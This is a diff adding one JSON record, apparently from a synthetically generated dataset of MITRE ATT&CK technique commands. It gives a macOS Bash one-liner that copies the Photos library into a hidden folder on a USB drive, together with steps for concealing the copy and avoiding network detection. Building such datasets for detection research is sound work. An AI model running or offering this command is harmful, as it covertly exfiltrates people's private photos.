@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "mkdir -p \"/Volumes/UNTITLED/.media\" && cp -Rp \"$HOME/Pictures/Photos Library.photoslibrary\" \"/Volumes/UNTITLED/.media/\"",
+  "explanation": "Exfiltrates the macOS Photos library by copying it to a concealed directory on a connected USB drive.",
+  "rationale_steps": [
+    "Identify large, sensitive media data in the Photos library bundle.",
+    "Create a hidden destination on the removable media.",
+    "Copy recursively with attributes to maintain plausible metadata.",
+    "Keep traffic local-only to avoid network-based detections."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-06d48d2a-40b55f98",
+  "source_prompt_hash": "06d48d2a",
+  "timestamp_utc": "2025-09-30T05:16:28.232349Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
